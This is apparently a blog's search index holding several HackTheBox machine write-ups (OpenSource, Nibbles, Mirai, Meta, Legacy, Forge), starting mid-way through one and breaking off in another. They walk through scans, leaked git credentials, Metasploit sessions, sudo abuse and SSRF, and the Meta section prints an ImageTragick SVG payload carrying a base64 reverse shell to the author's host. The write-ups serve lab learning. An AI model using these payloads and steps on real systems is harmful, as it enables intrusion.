the application┌──(bitis㉿workstation)-[~/htb/Machines/opensource]└─$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.82.65] 53948/app # To gain a foothold on the actual system hosting the container, we need to do some more enumeration of the git repo we downloaded earlier. If we run git branch on it we see that a dev branch exists. We can then switch branches, check the logs and then differences between the different commits:┌──(bitis㉿workstation)-[~/htb/Machines/opensource/source]└─$ git branch* dev public ┌──(bitis㉿workstation)-[~/htb/Machines/opensource/source]└─$ git log 1 ⨯commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&amp;gt; dev)Author: gituser &amp;lt;gituser@local&amp;gt;Date: Thu Apr 28 13:47:24 2022 +0200 ease testingcommit be4da71987bbbc8fae7c961fb2de01ebd0be1997Author: gituser &amp;lt;gituser@local&amp;gt;Date: Thu Apr 28 13:46:54 2022 +0200 added gitignorecommit a76f8f75f7a4a12b706b0cf9c983796fa1985820Author: gituser &amp;lt;gituser@local&amp;gt;Date: Thu Apr 28 13:46:16 2022 +0200 updatedcommit ee9d9f1ef9156c787d53074493e39ae364cd1e05Author: gituser &amp;lt;gituser@local&amp;gt;Date: Thu Apr 28 13:45:17 2022 +0200 initial┌──(bitis㉿workstation)-[~/htb/Machines/opensource/source]└─$ git diff ee9d9f1 a76f8f7 diff --git a/app/.vscode/settings.json b/app/.vscode/settings.jsonnew file mode 100644index 0000000..5975e3f--- /dev/null+++ b/app/.vscode/settings.json@@ -0,0 +1,5 @@+{+ &quot;python.pythonPath&quot;: &quot;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&quot;,+ &quot;http.proxy&quot;: &quot;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&quot;,+ &quot;http.proxyStrictSSL&quot;: false+}...The commit added the credentials dev01:Soulless_Developer#2022.Remembering that we found port 3000 in our portscan, but that it was filtered on our machine, we use chisel to port forward port 3000 to our machine. On the victim machine we do the following:┌──(bitis㉿workstation)-[~/htb/Machines/opensource]└─$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.82.65] 54294/app # cd /tmp cd /tmp/tmp # ./chisel client -v 10.10.17.182:8000 R:3000:172.17.0.1:3000./chisel client -v 10.10.17.182:8000 R:3000:172.17.0.1:30002022/06/25 19:19:27 client: Connecting to ws://10.10.17.182:80002022/06/25 19:19:27 client: Handshaking...2022/06/25 19:19:28 client: Sending config2022/06/25 19:19:28 client: Connection error: server: Server cannot listen on R:3000=&amp;gt;172.17.0.1:30002022/06/25 19:19:28 client: Give up/tmp # ./chisel client -v 10.10.17.182:8001 R:3000:172.17.0.1:3000./chisel client -v 10.10.17.182:8001 R:3000:172.17.0.1:30002022/06/25 19:20:32 client: Connecting to ws://10.10.17.182:80012022/06/25 19:20:32 client: Handshaking...2022/06/25 19:20:33 client: Sending config2022/06/25 19:20:33 client: Connected (Latency 46.611837ms)2022/06/25 19:20:33 client: tun: SSH connectedOn the attacker machine┌──(bitis㉿workstation)-[~/tools]└─$ ./chisel server --reverse -p 80012022/06/25 21:19:51 server: Reverse tunnelling enabled2022/06/25 21:19:51 server: Fingerprint 0SM8R8ZA9ESFE6zEmRmfs2LEpK+bGOB/CVvKKez7GZc=2022/06/25 21:19:51 server: Listening on http://0.0.0.0:80012022/06/25 21:20:31 server: session#1: tun: proxy#R:3000=&amp;gt;172.17.0.1:3000: ListeningNow anything we send to port 3000 on our machine will be send to port 3000 on the target host.When we visit localhost:3000 we get greeted with the following:We can then use the credentials found previously to login as dev01When looking at the commits of dev01, we find an ssh key:We can then save this ssh key and log in as dev01 on the target machine via ssh.Privilege escalationOnce logged in as dev01, we get and run pspy to snoop on any commands being run.2022/06/25 19:32:01 CMD: UID=0 PID=22743 | /bin/bash /usr/local/bin/git-sync 2022/06/25 19:32:01 CMD: UID=0 PID=22744 | git commit -m Backup for 2022-06-25 2022/06/25 19:32:01 CMD: UID=0 PID=22745 | /bin/bash /usr/local/bin/git-sync 2022/06/25 19:32:01 CMD: UID=0 PID=22748 | git push origin main Based on the output we can tell that the root user is running git commands such as commit and push. If we consult GTFObins, we can tell that this is exploitable by adding a command we wish to run as root to a file named .git/hooks/pre-commit.sample, renaming it and then waiting for root to commit something.Once this is done we have root access. Rooted!" }, { "title": "Nibbles writeup", "url": "/posts/nibbles/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, metasploit", "date": "2022-06-24 23:00:00 +0200", "snippet": "SummaryAn easy but frustrating box, based on the guessing required to get a foothold on the machine. Nevertheless let us take a look.FootholdWe start out with an nmap scan# Nmap 7.92 scan initiated Sun Feb 6 18:31:21 2022 as: nmap -sC -sV -o nmap/ini.txt 10.129.96.84Nmap scan report for 10.129.96.84Host is up (0.065s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Site doesn&#39;t have a title (text/html).|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Feb 6 18:31:31 2022 -- 1 IP address (1 host up) scanned in 9.68 secondsTwo ports are open, 22 and 80. Visiting the web application hosted on 80 we get greeted with a simple hello world. However, looking at the HTML source code we get told about a directory name /nibbleblog/. If we access the directory we find a blog, powered by Nibbleblog.If we scan this directory with gobuster we find a lot of other directories as well.┌──(bitis㉿workstation)-[~/htb/Machines/nibbles]└─$ gobuster dir -u 10.129.96.84/nibbleblog/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.96.84/nibbleblog/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/25 02:13:32 Starting gobuster in directory enumeration mode===============================================================/.html (Status: 403) [Size: 303]/.php (Status: 403) [Size: 302]/admin (Status: 301) [Size: 323] [--&amp;gt; http://10.129.96.84/nibbleblog/admin/]/plugins (Status: 301) [Size: 325] [--&amp;gt; http://10.129.96.84/nibbleblog/plugins/]/themes (Status: 301) [Size: 324] [--&amp;gt; http://10.129.96.84/nibbleblog/themes/] /.htm (Status: 403) [Size: 302] /content (Status: 301) [Size: 325] [--&amp;gt; http://10.129.96.84/nibbleblog/content/]/languages (Status: 301) [Size: 327] [--&amp;gt; http://10.129.96.84/nibbleblog/languages/]/. (Status: 200) [Size: 2987] /.htaccess (Status: 403) [Size: 307] /.php3 (Status: 403) [Size: 303] /.phtml (Status: 403) [Size: 304] /README (Status: 200) [Size: 4628] /.htc (Status: 403) [Size: 302] ...If we go to the content directory, we discover that it has directory listing enabled. We can then find a file named users.xml, containing a username:Content of users.xmlIf we search for nibbleblog exploits, we find the following two links. One is a exploitdb post detailing a metasploit module that allows us to gain a reverse shell on a system using nibbleblog version 4.0.3, while the other is a poc we would have to run ourselves. When trying the metasploit module we have to guess the credentials of the admin user. The credentials admin:nibbles seem to work, giving us a reverse shell:msf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set PASSWORD nibblesPASSWORD =&amp;gt; nibblesmsf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set USERNAME adminUSERNAME =&amp;gt; adminmsf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set TARGETURI /nibbleblogTARGETURI =&amp;gt; /nibbleblogmsf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; set RHOSTS 10.129.96.84RHOSTS =&amp;gt; 10.129.96.84msf6 exploit(multi/http/nibbleblog_file_upload) &amp;gt; run[*] Started reverse TCP handler on 10.10.17.182:4444 [*] Sending stage (39927 bytes) to 10.129.96.84[+] Deleted image.php[*] Meterpreter session 1 opened (10.10.17.182:4444 -&amp;gt; 10.129.96.84:47854) at 2022-06-25 02:23:12 +0200meterpreter &amp;gt; shellProcess 1669 created.Channel 2 created.iduid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)Privilege escalationWe first start out by running sudo -l, giving is the following output:sudo -lMatching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.shIf we go to nibblers home directory we see that there is no file named home/nibbler/personal/stuff/monitor.sh, indeed there is not even a directory named personal.pwd/home/nibblerls -altotal 20drwxr-xr-x 3 nibbler nibbler 4096 Dec 29 2017 .drwxr-xr-x 3 root root 4096 Dec 10 2017 ..-rw------- 1 nibbler nibbler 0 Dec 29 2017 .bash_historydrwxrwxr-x 2 nibbler nibbler 4096 Dec 10 2017 .nano-r-------- 1 nibbler nibbler 1855 Dec 10 2017 personal.zip-r-------- 1 nibbler nibbler 33 Jun 24 17:59 user.txtWhat we can do is we can simply create a file with the correct path that does whatever we want, and when called that file will give us a root shell.echo &quot;/bin/bash&quot; &amp;gt; monitor.shchmod +x monitor.shpython3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh&amp;lt;er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh root@Nibbles:/home/nibbler/personal/stuff# Rooted!" }, { "title": "Mirai writeup", "url": "/posts/Mirai/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, raspbery-pi, usb, forensics", "date": "2022-06-24 15:00:00 +0200", "snippet": "SummaryThis box is quite interesting, in the sense that once you have rooted the box, you are actually not quite done. You first need to recover the flag, which was accidentally deleted. A very interesting concept and a unique way to add a forensics challenge to the box.FootholdWe start out by doing a nmap port scan┌──(bitis㉿workstation)-[~/htb/Machines/mirai]└─$ nmap -sC -sV 10.129.83.20 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-25 00:55 CESTNmap scan report for 10.129.83.20Host is up (0.076s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)| ssh-hostkey: | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)| 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)| 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)|_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)53/tcp open domain dnsmasq 2.76| dns-nsid: |_ bind.version: dnsmasq-2.7680/tcp open http lighttpd 1.4.35|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).|_http-server-header: lighttpd/1.4.35Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds Three ports are open on the machine, port 22, 80 and 53 which is hosting a Domain Name Service. If we try to visit the web application, we just get greeted with a blank page. Scanning the application with gobuster reveals the following:┌──(bitis㉿workstation)-[~/htb/Machines/mirai]└─$ gobuster dir -u 10.129.83.20 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.83.20[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/25 01:00:11 Starting gobuster in directory enumeration mode===============================================================/admin (Status: 301) [Size: 0] [--&amp;gt; http://10.129.83.20/admin/]/.js (Status: 200) [Size: 61] /versions (Status: 200) [Size: 18] /.min.js (Status: 200) [Size: 61] /.inc.js (Status: 200) [Size: 61] /.3.2.min.js (Status: 200) [Size: 61] ===============================================================2022/06/25 01:04:16 Finished===============================================================If we visit /admin we are lead to the pi-hole admin console.The pi-hole admin consoleWe can then attempt to login.If we attempt the default credentials pi:raspberry on the admin console we fail to login, however we can actually ssh into the machine with these credentials.Privilege escalationRunning sudo -l reveals that we have complete access to sudo, so becoming root is as simple as running sudo su - or simply su -pi@raspberrypi:~ $ sudo -lMatching Defaults entries for pi on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser pi may run the following commands on localhost: (ALL : ALL) ALL (ALL) NOPASSWD: ALLpi@raspberrypi:~ $ su -Password: SSH is enabled and the default password for the &#39;pi&#39; user has not been changed.This is a security risk - please login as the &#39;pi&#39; user and type &#39;passwd&#39; to set a new password.SSH is enabled and the default password for the &#39;pi&#39; user has not been changed.This is a security risk - please login as the &#39;pi&#39; user and type &#39;passwd&#39; to set a new password.root@raspberrypi:~# Rooted! Or not? Reading root.txt reveals that the flag has been moved:root@raspberrypi:~# cat root.txtI lost my original root.txt! I think I may have a backup on my USB stick...Using df we can see filesystems as well as where they are mounted on the system.Filesystem 1K-blocks Used Available Use% Mounted onaufs 8856504 2835676 5547896 34% /tmpfs 102396 4884 97512 5% /run/dev/sda1 1354528 1354528 0 100% /lib/live/mount/persistence/sda1/dev/loop0 1267456 1267456 0 100% /lib/live/mount/rootfs/filesystem.squashfstmpfs 255988 0 255988 0% /lib/live/mount/overlay/dev/sda2 8856504 2835676 5547896 34% /lib/live/mount/persistence/sda2devtmpfs 10240 0 10240 0% /devtmpfs 255988 8 255980 1% /dev/shmtmpfs 5120 4 5116 1% /run/locktmpfs 255988 0 255988 0% /sys/fs/cgrouptmpfs 255988 8 255980 1% /tmp/dev/sdb 8887 93 8078 2% /media/usbsticktmpfs 51200 0 51200 0% /run/user/999tmpfs 51200 0 51200 0% /run/user/1000If we go to /media/usbstick we find this message from James:root@raspberrypi:/media/usbstick# lsdamnit.txt lost+foundroot@raspberrypi:/media/usbstick# cat damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick.Do you know if there is any way to get them back?-JamesWe can use dcfldd on the target machine to make a copy of the filesystem, which we can then coy to our system via scp.root@raspberrypi:/home/pi# dcfldd if=/dev/sdb of=/home/pi/usb2256 blocks (8Mb) written.320+0 records in320+0 records outroot@raspberrypi:/home/pi# We can then run testdisk on it.We then select the disk we want to test, the partition table type and list partition. I simply selected None as partition type. We can then see the contents of the partition.Testdisk finds root.txt on the partition, however if we copy the file with testdisk we get an empty file out. However since the file is clearly present somewhere on the filesystem, we can run strings on it and hopefully recover some of the data.┌──(bitis㉿workstation)-[~/htb/Machines/mirai]└─$ strings usb2&amp;gt;r &amp;amp;/media/usbsticklost+foundroot.txtdamnit.txt&amp;gt;r &amp;amp;&amp;gt;r &amp;amp;/media/usbsticklost+foundroot.txtdamnit.txt&amp;gt;r &amp;amp;/media/usbstick2]8^lost+foundroot.txtdamnit.txt&amp;gt;r &amp;amp;3d3e483143ff12ec505d026fa13e020bDamnit! Sorry man I accidentally deleted your files off the USB stick.Do you know if there is any way to get them back?-JamesLuckily the output of strings gives us the root flag, and we have finally rooted the machine!" }, { "title": "Meta writeup", "url": "/posts/Meta/", "categories": "Writeup, HackTheBox", "tags": "medium-box, exiftool, imagetragick", "date": "2022-06-24 12:00:00 +0200", "snippet": "SummaryFootholdWe start out with a nmap port scan.┌──(bitis㉿workstation)-[~/htb/Machines/meta]└─$ nmap -sC -sV 10.129.83.137 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 15:13 CESTNmap scan report for 10.129.83.137Host is up (0.13s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)| 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)|_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)80/tcp open http Apache httpd|_http-server-header: Apache|_http-title: Did not follow redirect to http://artcorp.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.35 secondsThe box has two open ports, 22 nad 80. We can see based on the scan that the web application hosted on port 80 redirects to http://artcorp.htb so let’s add it to our hosts file. We can then use gobuster to enumerate vhosts.┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]└─$ gobuster vhost -u artcorp.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://artcorp.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/24 15:47:54 Starting gobuster in VHOST enumeration mode===============================================================Found: dev01.artcorp.htb (Status: 200) [Size: 247] ===============================================================2022/06/24 15:48:25 Finished===============================================================Visiting dev01.artcorp.htb gets us to the following pagedev01 welcome pageTaking a look at the Metaview application, it seems that it simply takes a png/jpg and runs exiftool on it.Searching for vulnerabilities in exiftool leads us to the following github repository. A quick TL;DR of the exploit: in older versions of exiftool, if an image contained djvu data it would be impoperly handled, leading to code execution. We can leverage this into getting a reverse shell on the box.┌──(bitis㉿workstation)-[~/htb/Machines/meta/CVE-2021-22204-exiftool]└─$ nc -lvnp 9090 listening on [any] 9090 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.83.137] 42948/bin/sh: 0: can&#39;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ PivotNow that we have access as www-data on the box, it is time to get access to a proper user account. We can run pspy to see if there are any interesting processes being run on the box.2022/06/24 08:20:01 CMD: UID=0 PID=2038 | cp -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 2022/06/24 08:20:01 CMD: UID=1000 PID=2039 | /bin/bash /usr/local/bin/convert_images.sh 2022/06/24 08:20:01 CMD: UID=1000 PID=2040 | /usr/local/bin/mogrify -format png *.* 2022/06/24 08:20:01 CMD: UID=1000 PID=2041 | /bin/bash /usr/local/bin/convert_images.sh As we can see, root is messing around with neofetch for some reason, and the user with UID 1000 is running a script named convert_images.sh. The contents of the script can be found below:ww-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd /usr/local/bincd /usr/local/binwww-data@meta:/usr/local/bin$ lslsMagick++-config compare convert_images.sh import montageMagickCore-config composite display magick streamMagickWand-config conjure exiftool magick-scriptanimate convert identify mogrifywww-data@meta:/usr/local/bin$ cat convert_images.shcat convert_images.sh#!/bin/bashcd /var/www/dev01.artcorp.htb/convert_images/ &amp;amp;&amp;amp; /usr/local/bin/mogrify -format png *.* 2&amp;gt;/dev/nullpkill mogrifywww-data@meta:/usr/local/bin$ As we can see it is a rather straightforward oneliner. If we take a look at the other files found in the directory where the script is found we might be lead to belive that the system is using imagemagick to perform actions on user submitted images. This points us towards imagetragick. More specifically, the version of mogrify reveals that the box is using imagemagick version 7.0.10-36. Searching around for related exploits and proof-of-concepts gives us the following post, revealing that we can use an XML file to inject commands. I base64 encoded a reverse shell and uploaded the following xml file as a svg to the target system.&amp;lt;image authenticate=&#39;ff&quot; `echoL2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgJj4vZGV2L3RjcC8xMC4xMC4xNy4xODIvMTMzNyAwPiYxJwo=|base64 -d|bash`;&quot;&#39;&amp;gt;&amp;lt;read filename=&quot;pdf:/etc/passwd&quot;/&amp;gt;&amp;lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&amp;gt;&amp;lt;resize geometry=&quot;400x400&quot; /&amp;gt;&amp;lt;write filename=&quot;test.png&quot; /&amp;gt;&amp;lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&amp;gt;&amp;lt;image xlink:href=&quot;msl:shup.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;/image&amp;gt;Once the cron job has run we get a reverse shell:┌──(bitis㉿workstation)-[~]└─$ nc -lvnp 1337 listening on [any] 1337 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.83.137] 39694bash: cannot set terminal process group (2641): Inappropriate ioctl for devicebash: no job control in this shellthomas@meta:/var/www/dev01.artcorp.htb/convert_images$ Privilege escalationRunning sudo -l we get the following output:thomas@meta:~$ sudo -lMatching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOMEUser thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\&quot;\\&quot;thomas@meta:~$ We can neofetch as root. The interesting thing to note here is that we get to keep the value of the environmentv alue XDG_CONFIG_HOME Reading the documentation, this variable “defines the base directory relative to which user-specific configuration files should be stored. If $XDG_CONFIG_HOME is either not set or empty, a default equal to $HOME/.config should be used”. Since it is not set currently, this means that when we run neofetch, the config file is fetched from /root/.config. If we create a bash script somewhere and then replace the config file for neofetch with it, the content of the file will be executed. Assuming of course that we set the path to the script correctly prior to execution.thomas@meta:~/.config/neofetch$ echo &quot;exec /bin/bash&quot; &amp;gt; config.conf thomas@meta:~$ export XDG_CONFIG_HOME=~/.config/thomas@meta:~$ sudo neofetchroot@meta:/home/thomas# Rooted!" }, { "title": "Legacy writeup", "url": "/posts/Legacy/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, windows, metasploit", "date": "2022-06-22 20:00:00 +0200", "snippet": "SummaryThis was a very easy box that only required some basic google skills aswell as some knowledge of metasploit. let’s take a look.Foothold &amp;amp; PrivescLet’s start out by doing an nmap port scan.┌──(bitis㉿workstation)-[~/htb/Machines/Legacy]└─$ nmap -sC -sV 10.129.227.181Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-23 00:39 CESTNmap scan report for 10.129.227.181Host is up (0.099s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows XP microsoft-dsService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_clock-skew: mean: 4d22h27m49s, deviation: 2h07m16s, median: 4d20h57m49s| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:96:d1:40 (VMware)| smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager)| OS CPE: cpe:/o:microsoft:windows_xp::-| Computer name: legacy| NetBIOS computer name: LEGACY\\x00| Workgroup: HTB\\x00|_ System time: 2022-06-28T01:37:03+03:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.75 secondsThe nmap scan reveals that the machine is running Windows XP as its’ OS. Ports 139 and 445 are also open, which are used for SMB. I initially thought the machine would be vulnerable to eternalblue, and indeed it is, but the metasploit module for Eternalblue that I found only had payloads for x64 architecture, which the target machine was not using. Searching for related vulnerabilities points us towards the metasploit module found described here. let’s try to use it.msf6 exploit(windows/smb/ms08_067_netapi) &amp;gt; run[*] Started reverse TCP handler on 10.10.17.182:4444 [*] 10.129.227.181:445 - Automatically detecting the target...[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...[*] Sending stage (175686 bytes) to 10.129.227.181[*] Meterpreter session 1 opened (10.10.17.182:4444 -&amp;gt; 10.129.227.181:1032) at 2022-06-23 01:03:26 +0200meterpreter &amp;gt; getuidServer username: NT AUTHORITY\\SYSTEMmeterpreter &amp;gt; Rooted!" }, { "title": "Forge writeup", "url": "/posts/Forge/", "categories": "Writeup, HackTheBox", "tags": "medium-box", "date": "2022-06-22 19:00:00 +0200", "snippet": "SummaryThis was an interesting box, which is centered around a SSRF vulnerability being exploited into reading otherwise unaccessible web pages. Once a foothold has been established however, it is rather straight forward to obtain a root shell.FootholdWe start out as usual with a nmap port scan.Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 09:15 ESTNmap scan report for 10.129.252.106Host is up (0.050s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp filtered ftp22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)| 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)|_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://forge.htbService Info: Host: 10.129.252.106; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.07 secondsWe have 3 ports open. 21 which is hosting a filtered ftp service, along with port 22 and 80. It is usually a good idea to check for vhosts via gobuster as well when a box is hosting a web application.┌──(bitis㉿workstation)-[~/htb/Machines/Forge]└─$ gobuster vhost -u forge.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -r===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://forge.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/22 22:35:28 Starting gobuster in VHOST enumeration mode===============================================================Found: admin.forge.htb (Status: 200) [Size: 27]We have found another vhost. Let’s add it to the host file and check out both sites. The admin page only allows us to access it via localhost. Checking out the upload tab for the main site we see that we can upload images from an url.If attempt to upload an image hosted at http://admin.forge.htb we get told the adress is blacklisted.However, internet adresses are only case sensitive for anything after the domain name, meaning if we submit the url http://ADMIN.FORGE.HTB it will point towards the same site. Doing this successfully sidesteps the blacklist.If we follow the link we get told the image can’t be displayed since it contains errors. Using curl to get the address instead gives us the HTML code for the admin page.┌──(bitis㉿workstation)-[~/htb/Machines/Forge]└─$ curl http://forge.htb/uploads/nLqwXj3lfwRHmcIyKutx&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Admin Portal&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Welcome Admins!&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; As we can tell, the page also contains an announcement directory. Let’s take a look through the same functionality.┌──(bitis㉿workstation)-[~/htb/Machines/Forge]└─$ curl http://forge.htb/uploads/QEHi5NlzSVWCFpcAqGbc&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Announcements&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; 